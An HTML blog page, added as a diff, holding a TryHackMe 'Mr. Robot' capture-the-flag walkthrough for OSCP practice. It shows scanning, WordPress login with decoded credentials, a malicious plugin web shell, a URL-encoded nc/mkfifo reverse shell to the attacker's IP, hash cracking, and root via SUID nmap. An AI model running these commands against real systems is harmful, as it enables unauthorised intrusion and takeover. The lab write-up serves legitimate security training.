@@ -1,0 +1,962 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="\n#\rSolution\r#\rFinding the vulnerability\rnmap shows open ports 80 and 443.\n1 mkdir nmap &amp;&amp; nmap -p- -Pn -vv 10.10.231.235 -oN nmap/10.10.231.235-ports We run -A on the open ports.\n1 ports=$(grep &#39;^[0-9]&#39; nmap/10.10.231.235-ports | cut -d &#39;/&#39; -f 1 | tr &#39;\\n&#39; &#39;,&#39; | sed s/,$//) 1 nmap -A -p $ports -vv 10.10.231.235 -oA nmap/10.10.231.235-aggressive-scan We find the first key on /robots.txt. ">
+<title>Mr. Robot CTF</title>
+
+<link rel='canonical' href='https://pho3nix-jacki3.github.io/p/mr.-robot-ctf/'> 
+<link rel="stylesheet" href="/scss/style.min.7e25752da02be3d43ff6eb2384c8a9c2c26ecf308b9cb3b7bd8c7ae7562e6e6e.css" />
+<meta property='og:title' content="Mr. Robot CTF">
+<meta property='og:description' content="\n#\rSolution\r#\rFinding the vulnerability\rnmap shows open ports 80 and 443.\n1 mkdir nmap &amp;&amp; nmap -p- -Pn -vv 10.10.231.235 -oN nmap/10.10.231.235-ports We run -A on the open ports.\n1 ports=$(grep &#39;^[0-9]&#39; nmap/10.10.231.235-ports | cut -d &#39;/&#39; -f 1 | tr &#39;\\n&#39; &#39;,&#39; | sed s/,$//) 1 nmap -A -p $ports -vv 10.10.231.235 -oA nmap/10.10.231.235-aggressive-scan We find the first key on /robots.txt. ">
+<meta property='og:url' content='https://pho3nix-jacki3.github.io/p/mr.-robot-ctf/'>
+<meta property='og:site_name' content='Blue Pho3nix'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Medium' /><meta property='article:tag' content='Linux' /><meta property='article:tag' content='OSCP Prep' /><meta property='og:image' content='https://pho3nix-jacki3.github.io/p/mr.-robot-ctf/img/mr-robot.png' />
+<meta name="twitter:title" content="Mr. Robot CTF">
+<meta name="twitter:description" content="\n#\rSolution\r#\rFinding the vulnerability\rnmap shows open ports 80 and 443.\n1 mkdir nmap &amp;&amp; nmap -p- -Pn -vv 10.10.231.235 -oN nmap/10.10.231.235-ports We run -A on the open ports.\n1 ports=$(grep &#39;^[0-9]&#39; nmap/10.10.231.235-ports | cut -d &#39;/&#39; -f 1 | tr &#39;\\n&#39; &#39;,&#39; | sed s/,$//) 1 nmap -A -p $ports -vv 10.10.231.235 -oA nmap/10.10.231.235-aggressive-scan We find the first key on /robots.txt. "><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://pho3nix-jacki3.github.io/p/mr.-robot-ctf/img/mr-robot.png' />
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "dark");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_2f3062cb4e01dc1b.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🔥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Blue Pho3nix</a></h1>
+            <h2 class="site-description">Learn cool stuff</h2>
+        </div>
+    </header><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                
+                <span>Categories</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#finding-the-vulnerability">Finding the vulnerability</a></li>
+    <li><a href="#foothold">Foothold</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+  </ul>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+    
+   
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/thm/" style="background-color: ; color: #fff;">
+                TryHackMe Walkthroughs
+            </a>
+        
+        
+    <section class="article-tags">
+        
+            <a href="/tags/medium/">Medium</a>
+        
+            <a href="/tags/linux/">Linux</a>
+        
+            <a href="/tags/oscp-prep/">OSCP Prep</a>
+        
+    </section>
+
+
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/mr.-robot-ctf/">Mr. Robot CTF</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    2 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+
+    <section class="article-content">
+    
+    
+    <p><img src="/p/mr.-robot-ctf/img/intro.png"
+	width="1152"
+	height="651"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="176"
+		data-flex-basis="424px"
+	
+></p>
+<h1 id="solution">
+    <a href="#solution" class="header-anchor">#</a>
+    Solution
+</h1><h2 id="finding-the-vulnerability">
+    <a href="#finding-the-vulnerability" class="header-anchor">#</a>
+    Finding the vulnerability
+</h2><p><code>nmap</code> shows open ports 80 and 443.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkdir nmap <span class="o">&amp;&amp;</span> nmap -p- -Pn -vv 10.10.231.235 -oN nmap/10.10.231.235-ports
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/mr.-robot-ctf/img/1.png"
+	width="1065"
+	height="572"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="186"
+		data-flex-basis="446px"
+	
+></p>
+<p>We run <code>-A</code> on the open ports.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">ports</span><span class="o">=</span><span class="k">$(</span>grep <span class="s1">&#39;^[0-9]&#39;</span> nmap/10.10.231.235-ports <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f <span class="m">1</span> <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed s/,$//<span class="k">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -A  -p <span class="nv">$ports</span> -vv 10.10.231.235 -oA nmap/10.10.231.235-aggressive-scan
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/mr.-robot-ctf/img/2.png"
+	width="1204"
+	height="828"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="145"
+		data-flex-basis="348px"
+	
+></p>
+<p>We find the first key on <code>/robots.txt</code>.
+<img src="/p/mr.-robot-ctf/img/3.png"
+	width="890"
+	height="217"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="410"
+		data-flex-basis="984px"
+	
+>
+<img src="/p/mr.-robot-ctf/img/4.png"
+	width="1002"
+	height="268"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="373"
+		data-flex-basis="897px"
+	
+></p>
+<p>We find a username and password on <code>/license</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">feroxbuster -u http://10.10.231.235
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/mr.-robot-ctf/img/5.png"
+	width="1490"
+	height="924"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="161"
+		data-flex-basis="387px"
+	
+></p>
+<p><img src="/p/mr.-robot-ctf/img/6.png"
+	width="1310"
+	height="886"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="147"
+		data-flex-basis="354px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;ZWxsaW90OkVSMjgtMDY1Mgo=&#34;</span> <span class="p">|</span> base64 -d 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/mr.-robot-ctf/img/7.png"
+	width="1101"
+	height="86"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1280"
+		data-flex-basis="3072px"
+	
+></p>
+<p>We use the username and password to login to <code>/wp-login.php</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">elliot:ER28-0652
+</span></span></code></pre></td></tr></table>
+</div>
+</div><hr>
+<h2 id="foothold">
+    <a href="#foothold" class="header-anchor">#</a>
+    Foothold
+</h2><p>We create and uploade a malicious plugin with <a class="link" href="https://raw.githubusercontent.com/wetw0rk/malicious-wordpress-plugin/refs/heads/master/wordpwn.py"  target="_blank" rel="noopener"
+    >wordpwn.py</a>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget https://raw.githubusercontent.com/wetw0rk/malicious-wordpress-plugin/refs/heads/master/wordpwn.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/mr.-robot-ctf/img/8.png"
+	width="1822"
+	height="233"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="781"
+		data-flex-basis="1876px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python wordpwn.py 10.6.66.180 <span class="m">4444</span> 10.10.231.235
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/mr.-robot-ctf/img/9.png"
+	width="1142"
+	height="629"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="181"
+		data-flex-basis="435px"
+	
+></p>
+<p><img src="/p/mr.-robot-ctf/img/10.png"
+	width="1119"
+	height="818"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="136"
+		data-flex-basis="328px"
+	
+></p>
+<p><img src="/p/mr.-robot-ctf/img/11.png"
+	width="1738"
+	height="580"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="299"
+		data-flex-basis="719px"
+	
+></p>
+<p><img src="/p/mr.-robot-ctf/img/12.png"
+	width="1235"
+	height="346"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="356"
+		data-flex-basis="856px"
+	
+></p>
+<hr>
+<p>We navigate to <code>/wp-content/plugins/malicious/SWebTheme.php?cmd=ls</code>.
+<img src="/p/mr.-robot-ctf/img/13.png"
+	width="1212"
+	height="225"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="538"
+		data-flex-basis="1292px"
+	
+></p>
+<p>Next, we get a reverse shell with a url encoded nc mkfifo from <a class="link" href="https://www.revshells.com/"  target="_blank" rel="noopener"
+    >www.revshells.com</a>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">rlwrap -cAr nc -lvnp <span class="m">9001</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>/wp-content/plugins/malicious/SWebTheme.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%2010.6.66.180%209001%20%3E%2Ftmp%2Ff</code></p>
+<p><img src="/p/mr.-robot-ctf/img/14.png"
+	width="1134"
+	height="835"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="135"
+		data-flex-basis="325px"
+	
+>
+<img src="/p/mr.-robot-ctf/img/15.png"
+	width="1141"
+	height="192"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="594"
+		data-flex-basis="1426px"
+	
+></p>
+<hr>
+<h2 id="privilege-escalation">
+    <a href="#privilege-escalation" class="header-anchor">#</a>
+    Privilege Escalation
+</h2><p>We upgrade our shell.</p>
+<p><strong>1.</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 -c <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>2.</strong></p>
+<p>CTRL + Z</p>
+<p><strong>3.</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">stty raw -echo<span class="p">;</span><span class="nb">fg</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>4.</strong></p>
+<p>[Enter] <br>
+[Enter]</p>
+<p><img src="/p/mr.-robot-ctf/img/17.png"
+	width="1022"
+	height="235"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="434"
+		data-flex-basis="1043px"
+	
+></p>
+<p>We find a user <code>robot</code> and a password file we can read.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ls /home/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> /home/robot
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ls -la
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/mr.-robot-ctf/img/16.png"
+	width="1225"
+	height="274"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="447"
+		data-flex-basis="1072px"
+	
+></p>
+<p><img src="/p/mr.-robot-ctf/img/18.png"
+	width="1061"
+	height="89"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1192"
+		data-flex-basis="2861px"
+	
+></p>
+<p>We crack the password hash.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hashcat -m <span class="m">0</span> <span class="nb">hash</span> /usr/share/wordlists/rockyou.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/mr.-robot-ctf/img/19.png"
+	width="766"
+	height="71"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1078"
+		data-flex-basis="2589px"
+	
+>
+<img src="/p/mr.-robot-ctf/img/20.png"
+	width="1031"
+	height="188"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="548"
+		data-flex-basis="1316px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">robot:abcdefghijklmnopqrstuvwxyz
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We su into the <code>robot</code> user and get the second flag.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">su robot
+</span></span><span class="line"><span class="cl">password: abcdefghijklmnopqrstuvwxyz
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat key-2-of-3.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/mr.-robot-ctf/img/21.png"
+	width="1060"
+	height="226"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="469"
+		data-flex-basis="1125px"
+	
+></p>
+<p>We find <code>nmap</code> with <code>SUID</code> privileges.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">find / -type f -perm -4000  2&gt;/dev/null
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We use <a class="link" href="https://gtfobins.github.io/gtfobins/nmap/#shell"  target="_blank" rel="noopener"
+    >GTFOBins</a> to get root and the last flag.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap --interactive
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">!sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> /root
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat key-3-of-3.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/mr.-robot-ctf/img/23.png"
+	width="1297"
+	height="466"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="278"
+		data-flex-basis="667px"
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/jeeves/">
+        
+        
+            <div class="article-image">
+                <img src="/p/jeeves/img/jeeves-icon.aa783c41141fe2a0afd5c54c1c709ac6_hu_16ffec5202558f5c.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Jeeves"
+                        
+                        data-hash="md5-qng8QRQf4qCv1cVMHHCaxg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Jeeves</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2024 - 
+        
+        2025 Blue Pho3nix
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.25.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
